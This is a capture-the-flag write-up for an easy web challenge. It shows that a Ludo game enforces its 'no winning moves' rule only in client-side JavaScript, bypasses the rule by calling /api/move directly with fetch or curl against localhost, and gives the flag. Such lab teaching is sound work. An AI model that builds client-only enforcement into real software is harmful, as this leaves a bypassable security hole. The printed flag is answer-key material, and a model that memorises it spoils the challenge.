# LUDO — The Forbidden Six — Writeup

**Challenge:** LUDO — The Forbidden Six
**Category:** Web
**Difficulty:** Easy / Medium
**Vulnerability Class:** Client-Side Validation Bypass / Improper Server-Side Validation (CWE-602: Client-Side Enforcement of Server-Side Security)

---

## 1. Reconnaissance

The player loads the challenge and sees:

- Red tokens 1–3 already home.
- Red token #4 sitting one move from finishing.
- Dice fixed at 6.
- A status line reading "Winning moves are disabled."

Clicking token #4 (or the "Move Token #4" button) triggers a shake
animation and a log line saying the move was blocked. The move never
reaches the network — this is the first hint that the block is purely
cosmetic/client-side.

## 2. Source analysis

Opening DevTools → Sources (or just viewing `app.js`) reveals:

```js
function validateMove(move) {
  const simulated = simulateMove(move);

  if (!simulated.legal) { ... }

  if (simulated.winner) {
    showSystemNotice("Winning moves are disabled.");
    return false;
  }

  return true;
}
```

`validateMove()` is called from `makeMove()` *before* `sendMove()` is
ever invoked. In other words: the "no winning moves" rule short-circuits
the function before any HTTP request is made. It is enforced entirely
in the browser.

## 3. API discovery

Reading `sendMove()`:

```js
async function sendMove(move) {
  const res = await fetch("/api/move", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(move),
  });
  return res.json();
}
```

...and `makeMove()`'s call `{ token: 4, dice: state.dice }` tells the
player exactly what a legitimate request body looks like:

```json
{ "token": 4, "dice": 6 }
```

The Network tab confirms `/api/state` and `/api/reset` as the other two
endpoints, and shows that `/api/state` never contains a flag field, even
after other tokens are inspected.

## 4. Exploitation

The player bypasses `validateMove()` entirely by calling the API
directly — from the DevTools console, curl, or any HTTP client:

```js
fetch('/api/move', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ token: 4, dice: 6 })
})
.then(r => r.json())
.then(console.log);
```

or:

```bash
curl -s -X POST http://localhost:3000/api/move \
  -H "Content-Type: application/json" \
  -d '{"token":4,"dice":6}'
```

## 5. Root cause

`server.js` `/api/move` re-validates *legality* (correct token id,
correct turn, correct dice value, no overshoot) but was never given the
"disallow winning moves" business rule that only exists in
`app.js::validateMove()`. Since the only legal move available for token
4 in this deterministic state also happens to be the winning move, any
syntactically valid request that passes basic legality checks wins the
game.

## 6. Result — expected response

```json
{
  "ok": true,
  "winner": "red",
  "state": {
    "turn": "red",
    "dice": 6,
    "winner": "red",
    "tokens": {
      "1": { "position": 50, "finished": true },
      "2": { "position": 50, "finished": true },
      "3": { "position": 50, "finished": true },
      "4": { "position": 50, "finished": true }
    }
  },
  "flag": "NullOrigin{tH3_c1ient_siD3_spe4ks_th3_TrUth}"
}
```
